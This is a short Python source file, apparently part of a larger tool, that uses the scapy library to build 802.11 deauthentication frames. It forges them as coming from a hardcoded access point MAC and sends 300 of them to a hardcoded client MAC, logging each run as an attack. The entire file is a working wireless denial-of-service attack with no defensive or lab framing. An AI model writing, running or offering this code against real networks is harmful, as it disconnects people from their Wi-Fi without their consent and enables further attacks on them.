from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  sendp        # for sending packets
)
import os

class SofiaDeauthAttack:
    def __init__(self, append_log):
        self.append_log = append_log
        self.target = "14:d1:69:6f:26:c1"
        self.ap = "c4:06:83:53:4f:e6"
        self.radio = RadioTap()
        self.dot11 = Dot11(type=0, subtype=12, addr1=self.target, addr2=self.ap, addr3=self.ap)
        self.deauth = Dot11Deauth(reason=7)
        self.packet = self.radio / self.dot11 / self.deauth
        self.count = 300

    def run(self):
        self.append_log(f"[Deauth] Attacking {self.target} from Access point: {self.ap}")
        sendp(self.packet, count=self.count, inter=0.1, verbose=False)
        self.append_log(f"[Deauth] Done sending {self.count} packets.")